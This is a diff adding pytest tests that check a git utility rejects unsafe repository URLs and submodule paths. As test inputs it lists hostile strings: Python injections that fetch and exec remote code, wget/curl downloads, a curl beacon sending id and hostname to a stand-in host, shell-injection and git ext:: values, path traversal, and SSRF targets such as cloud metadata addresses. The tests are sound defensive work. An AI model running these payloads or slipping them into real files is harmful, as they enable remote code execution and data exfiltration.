@@ -4,11 +4,13 @@
 
 import contextlib
 import os
+import re
 import socket
 import subprocess
 import tempfile
 import threading
 import time
+from pathlib import Path
 from typing import List
 
 import git
@@ -184,6 +186,280 @@ def test_get_temp_dir_cleans_up_when_body_raises(temp_root):
 	assert os.listdir(temp_root) == []
 
 
+@pytest.mark.parametrize("url, expected", [
+	("https://github.com/a/b", "https://github.com/a/b"),
+	("http://github.com/a/b.git", "https://github.com/a/b.git"),
+	("git://codeberg.org/a/b", "https://codeberg.org/a/b"),
+	("https://GitHub.com/a/b", "https://github.com/a/b"),
+	(" https://github.com/a/b ", "https://github.com/a/b"),
+	("https://github.com/a/b?tab=readme-ov-file", "https://github.com/a/b"),
+	("https://user:token@github.com:8080/a/b#readme", "https://github.com/a/b"),
+])
+def test_generate_git_url(url, expected):
+	assert git_utils.generate_git_url(url) == expected
+
+
+@pytest.mark.parametrize("url", [
+	"https://evil.example/a/b",
+	"https://github.com.evil.example/a/b",
+	"https://evil.example#@github.com/a/b",
+	"https://127.0.0.1/a/b",
+	"https://[::1]/a/b",
+	"https://169.254.169.254/latest/meta-data",
+	"http://localhost/a/b",
+	"http://db:5432/",
+	"github.com/a/b",
+	"file:///etc/passwd",
+	"/home/cdb/config.cfg",
+	"",
+])
+def test_generate_git_url_rejects_host(url):
+	with pytest.raises(TaskError, match="not allowed"):
+		git_utils.generate_git_url(url)
+
+
+def test_generate_git_url_rejects_malformed():
+	with pytest.raises(TaskError, match="not valid"):
+		git_utils.generate_git_url("https://[evil/a")
+
+
+def test_disallowed_host_refused_before_git(monkeypatch):
+	def no_git(*args, **kwargs):
+		raise AssertionError("git was called")
+
+	monkeypatch.setattr(git_utils, "_run_git", no_git)
+	monkeypatch.setattr(git.cmd.Git, "execute", no_git)
+
+	url = "https://evil.example/a/b"
+	for func in [
+		lambda: clone_repo(url).__enter__(),
+		lambda: clone_repo(url, "master").__enter__(),
+		lambda: get_latest_commit(url),
+		lambda: get_latest_tag(url),
+		lambda: get_commit_list(url, "a", "b"),
+	]:
+		with pytest.raises(TaskError, match="not allowed"):
+			func()
+
+
+PAYLOAD_PATHS = [
+	'a");import os;os.environ["no_proxy"]=chr(42);exec(__import__("urllib.request").request.urlopen("https"+chr(58)+chr(47)+chr(47)+"example.invalid"+chr(47)+"p.py").read())#',
+	'a");import os;os.system("wget -qO /tmp/z1 https://example.invalid/z1 || curl -sko /tmp/z1 https://example.invalid/z1");#',
+	'a");import os;os.system("curl https://example.invalid/beacon?d=$(id;hostname;uname -srm)")#',
+	"a;touch canary",
+	"$(touch canary)",
+	"`touch canary`",
+	"a'b",
+	"a\nb",
+	"a b",
+	"-evil",
+	"--upload-pack=touch canary",
+	"../evil",
+	"a/../b",
+	"/etc",
+	".",
+	"a//b",
+	"a/",
+	".git",
+	"a/.GIT/hooks",
+	"",
+]
+
+
+@pytest.mark.parametrize("path", PAYLOAD_PATHS)
+def test_check_submodules_rejects_path(path):
+	with pytest.raises(TaskError, match="path is not allowed"):
+		git_utils._check_submodules({"x": {"path": path, "url": "https://github.com/a/b.git"}})
+
+
+@pytest.mark.parametrize("url, match", [
+	("http://github.com/a/b.git", "doesn't use https://"),
+	("git://github.com/a/b.git", "doesn't use https://"),
+	("ssh://git@github.com/a/b.git", "doesn't use https://"),
+	("git@github.com:a/b.git", "doesn't use https://"),
+	("../b.git", "doesn't use https://"),
+	("./b", "doesn't use https://"),
+	("/tmp/b", "doesn't use https://"),
+	("file:///tmp/b", "doesn't use https://"),
+	("ext::sh -c touch% canary", "doesn't use https://"),
+	("https://evil.example/a/b.git", "host 'evil.example' is not allowed"),
+	("https://127.0.0.1/a/b.git", "host '127.0.0.1' is not allowed"),
+	("https://GitHub.com/a/b.git", "Please use 'https://github.com/a/b.git' instead"),
+	("https://user@github.com/a/b.git", "Please use 'https://github.com/a/b.git' instead"),
+	("https://github.com/a/b.git?x=1", "Please use 'https://github.com/a/b.git' instead"),
+	("https://[evil/a", "not valid"),
+])
+def test_check_submodules_rejects_url(url, match):
+	with pytest.raises(TaskError, match=re.escape(match)):
+		git_utils._check_submodules({"x": {"path": "x", "url": url}})
+
+
+def test_check_submodules_accepts_valid():
+	assert git_utils._check_submodules({
+		"a": {"path": "mods/a", "url": "https://github.com/a/a.git"},
+		"b.c": {"path": "b.c", "url": "https://codeberg.org/b/c", "branch": "main"},
+	}) == ["mods/a", "b.c"]
+
+
+@pytest.mark.parametrize("modules, match", [
+	({"a": {"path": "a"}}, "needs both"),
+	({"a": {"url": "https://github.com/a/a"}}, "needs both"),
+	({"a": {"path": "mods/a", "url": "https://github.com/a/a"},
+			"b": {"path": "Mods/A", "url": "https://github.com/a/b"}}, "used twice"),
+])
+def test_check_submodules_rejects_entries(modules, match):
+	with pytest.raises(TaskError, match=match):
+		git_utils._check_submodules(modules)
+
+
+def make_repo(path: Path) -> git.Repo:
+	repo = git.Repo.init(path, initial_branch="master")
+	repo.git.update_environment(GIT_CONFIG_COUNT="1",
+			GIT_CONFIG_KEY_0="protocol.file.allow", GIT_CONFIG_VALUE_0="always")
+	with repo.config_writer() as cw:
+		cw.set_value("user", "name", "Test")
+		cw.set_value("user", "email", "test@example.com")
+	(path / "init.lua").write_text("")
+	repo.index.add(["init.lua"])
+	repo.index.commit("Initial commit")
+	return repo
+
+
+def add_submodule(repo: git.Repo, sub: git.Repo, path: str):
+	repo.git.submodule("add", Path(sub.working_tree_dir).as_uri(), path)
+	repo.index.commit("Add " + path)
+
+
+def set_gitmodule(repo: git.Repo, name: str, path: str, url: str):
+	repo.git.config("-f", ".gitmodules", f"submodule.{name}.path", path)
+	repo.git.config("-f", ".gitmodules", f"submodule.{name}.url", url)
+	repo.index.add([".gitmodules"])
+	repo.index.commit("Edit .gitmodules")
+
+
+def add_gitlink(repo: git.Repo, path: str):
+	repo.git.update_index("--add", "--cacheinfo", f"160000,{repo.head.commit.hexsha},{path}")
+	repo.index.commit("Add gitlink " + path)
+
+
+@pytest.fixture
+def nested_repo(tmp_path, monkeypatch):
+	"""
+	top -> mid -> mods/leaf, and top -> other.
+	top's .gitmodules also has stale entries with no gitlink, one of them a payload,
+	and top has a gitlink with no .gitmodules entry.
+	Returns top's file:// URL.
+	"""
+	leaf = make_repo(tmp_path / "leaf")
+	mid = make_repo(tmp_path / "mid")
+	add_submodule(mid, leaf, "mods/leaf")
+	other = make_repo(tmp_path / "other")
+	top = make_repo(tmp_path / "top")
+	add_submodule(top, mid, "mid")
+	add_submodule(top, other, "other")
+	set_gitmodule(top, "gone", "gone", (tmp_path / "leaf").as_uri())
+	set_gitmodule(top, "junk", "../evil", "ext::sh -c touch% canary")
+	add_gitlink(top, "orphan")
+
+	monkeypatch.setattr(git_utils, "generate_git_url", lambda url: url)
+	monkeypatch.setattr(git_utils, "_check_submodule_url", lambda path, url: None)
+	return (tmp_path / "top").as_uri()
+
+
+@pytest.mark.parametrize("ref", [None, "master"])
+def test_clone_nested_submodules(nested_repo, allow_file_protocol, ref):
+	with clone_repo(nested_repo, ref, recursive=True) as repo:
+		root = repo.working_tree_dir
+		assert os.path.isfile(os.path.join(root, "mid", "init.lua"))
+		assert os.path.isfile(os.path.join(root, "mid", "mods", "leaf", "init.lua"))
+		assert os.path.isfile(os.path.join(root, "other", "init.lua"))
+		assert not os.path.exists(os.path.join(root, "gone"))
+		assert os.listdir(os.path.join(root, "orphan")) == []
+
+
+@pytest.mark.parametrize("ref", [None, "master"])
+def test_clone_skips_submodules_unless_recursive(nested_repo, allow_file_protocol, ref):
+	with clone_repo(nested_repo, ref) as repo:
+		assert not os.path.exists(os.path.join(repo.working_tree_dir, "mid", "init.lua"))
+		assert not os.path.exists(os.path.join(repo.working_tree_dir, "other", "init.lua"))
+
+
+@pytest.mark.parametrize("ref", [None, "master"])
+def test_clone_submodule_limits(nested_repo, allow_file_protocol, monkeypatch, ref):
+	monkeypatch.setattr(git_utils, "MAX_SUBMODULE_DEPTH", 1)
+	with pytest.raises(TaskError, match="nested more than 1 levels"):
+		with clone_repo(nested_repo, ref, recursive=True):
+			pass
+
+	monkeypatch.setattr(git_utils, "MAX_SUBMODULE_DEPTH", 5)
+	monkeypatch.setattr(git_utils, "MAX_SUBMODULES", 2)
+	with pytest.raises(TaskError, match="Too many submodules"):
+		with clone_repo(nested_repo, ref, recursive=True):
+			pass
+
+
+@pytest.mark.parametrize("ref", [None, "master"])
+def test_clone_submodules_share_one_timeout(nested_repo, allow_file_protocol, monkeypatch, ref):
+	real_run_git = git_utils._run_git
+	commands = []
+
+	def slow(args, *rest, **kwargs):
+		commands.append(args)
+		time.sleep(1.1)
+		return real_run_git(args, *rest, **kwargs)
+
+	monkeypatch.setattr(git_utils, "_run_git", slow)
+	monkeypatch.setattr(git_utils, "GIT_FETCH_TIMEOUT", 1)
+
+	with pytest.raises(TaskError, match="Timed out fetching submodules"):
+		with clone_repo(nested_repo, ref, recursive=True):
+			pass
+
+	assert [args[0] for args in commands].count("submodule") == 1
+
+
+@pytest.mark.parametrize("ref", [None, "master"])
+def test_clone_rejects_payload_before_fetching(local_repo, allow_file_protocol, tmp_path, monkeypatch, ref):
+	url, _, _ = local_repo
+	canary = tmp_path / "canary"
+	repo = git.Repo(tmp_path / "origin")
+	for name, path in [("x", f'a");import os;os.system("touch {canary}")#'), ("y", f"$(touch {canary})")]:
+		set_gitmodule(repo, name, path, url)
+		add_gitlink(repo, path)
+
+	real_run_git = git_utils._run_git
+	commands = []
+
+	def spy(args, *rest, **kwargs):
+		commands.append(args)
+		return real_run_git(args, *rest, **kwargs)
+
+	monkeypatch.setattr(git_utils, "_run_git", spy)
+
+	with pytest.raises(TaskError, match="path is not allowed"):
+		with clone_repo(url, ref, recursive=True):
+			pass
+
+	assert not any(args[0] == "submodule" for args in commands)
+	assert not canary.exists()
+
+
+@pytest.mark.parametrize("ref", [None, "master"])
+def test_clone_rejects_nested_payload(tmp_path, allow_file_protocol, monkeypatch, ref):
+	leaf = make_repo(tmp_path / "leaf")
+	mid = make_repo(tmp_path / "mid")
+	set_gitmodule(mid, "evil", "a;touch evil", Path(leaf.working_tree_dir).as_uri())
+	add_gitlink(mid, "a;touch evil")
+	top = make_repo(tmp_path / "top")
+	add_submodule(top, mid, "mid")
+	monkeypatch.setattr(git_utils, "generate_git_url", lambda url: url)
+	monkeypatch.setattr(git_utils, "_check_submodule_url", lambda path, url: None)
+
+	with pytest.raises(TaskError, match="path is not allowed"):
+		with clone_repo((tmp_path / "top").as_uri(), ref, recursive=True):
+			pass
+
+
 @pytest.fixture
 def stall_server():
 	"""
@@ -211,6 +487,7 @@ def stall_server():
 def short_timeouts(monkeypatch):
 	monkeypatch.setattr(git_utils, "GIT_TIMEOUT", 2)
 	monkeypatch.setattr(git_utils, "GIT_FETCH_TIMEOUT", 2)
+	monkeypatch.setitem(git_utils.GIT_ENV, "GIT_ALLOW_PROTOCOL", "http")
 	monkeypatch.delitem(git_utils.GIT_ENV, "GIT_HTTP_LOW_SPEED_LIMIT")
 	monkeypatch.delitem(git_utils.GIT_ENV, "GIT_HTTP_LOW_SPEED_TIME")
 
@@ -252,6 +529,7 @@ def test_stalled_server_times_out(stall_server, short_timeouts, temp_root, monke
 def test_stalled_submodule_times_out(local_repo, stall_server, short_timeouts, tmp_path, monkeypatch):
 	url, _, _ = local_repo
 	monkeypatch.setitem(git_utils.GIT_ENV, "GIT_ALLOW_PROTOCOL", "file:http")
+	monkeypatch.setattr(git_utils, "_check_submodule_url", lambda path, url: None)
 
 	repo = git.Repo(tmp_path / "origin")
 	(tmp_path / "origin" / ".gitmodules").write_text(f'[submodule "sub"]\n\tpath = sub\n\turl = {stall_server}\n')
@@ -270,6 +548,7 @@ def test_stalled_submodule_times_out(local_repo, stall_server, short_timeouts, t
 def test_low_speed_limit_is_used(stall_server, monkeypatch):
 	monkeypatch.setattr(git_utils, "generate_git_url", lambda url: url)
 	monkeypatch.setitem(git_utils.GIT_ENV, "GIT_HTTP_LOW_SPEED_TIME", "1")
+	monkeypatch.setitem(git_utils.GIT_ENV, "GIT_ALLOW_PROTOCOL", "http")
 
 	with pytest.raises(git.GitCommandError, match="too slow"):
 		get_latest_commit(stall_server)
